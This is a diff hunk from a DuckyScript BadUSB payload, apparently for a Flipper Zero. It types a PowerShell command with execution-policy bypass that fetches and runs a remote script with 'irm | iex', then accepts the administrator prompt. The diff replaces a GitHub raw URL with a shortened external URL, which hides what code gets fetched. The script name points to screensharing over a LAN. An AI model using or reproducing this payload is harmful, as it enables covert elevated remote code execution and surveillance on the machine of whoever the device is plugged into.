@@ -10,7 +10,7 @@ REM open powershell (remove "-W H" to show the window)
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -NoP -Ep Bypass -C $port = 8080;irm https://raw.githubusercontent.com/beigeworm/BadUSB-Files-For-FlipperZero/main/Screenshare-Over-LAN/main.ps1 | iex
+STRING powershell -NoP -Ep Bypass -C $port = 8080;irm https://bw0.cc/lanss | iex
 CTRL-SHIFT ENTER
 DELAY 2500
 ALT y
